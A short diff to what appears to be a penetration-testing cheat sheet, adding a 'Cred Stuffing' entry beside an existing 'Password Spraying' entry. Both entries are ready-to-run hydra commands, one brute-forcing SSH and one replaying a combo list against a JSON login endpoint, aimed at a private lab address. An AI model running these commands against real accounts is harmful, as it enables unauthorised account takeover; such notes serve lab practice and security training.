@@ -14,6 +14,11 @@ Password Spraying
 cd Desktop
 hydra -L userlist.txt -P passlist.txt -u ssh://192.168.6.4 -t 4 -V
 
+Cred Stuffing
+(Kali)
+hydra -C combo.txt 192.168.6.4 -s 8081 http-post-form -t 4 -V \
+'/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\: application/json:1=:S=authentication'
+
 
 
 SQL Injection
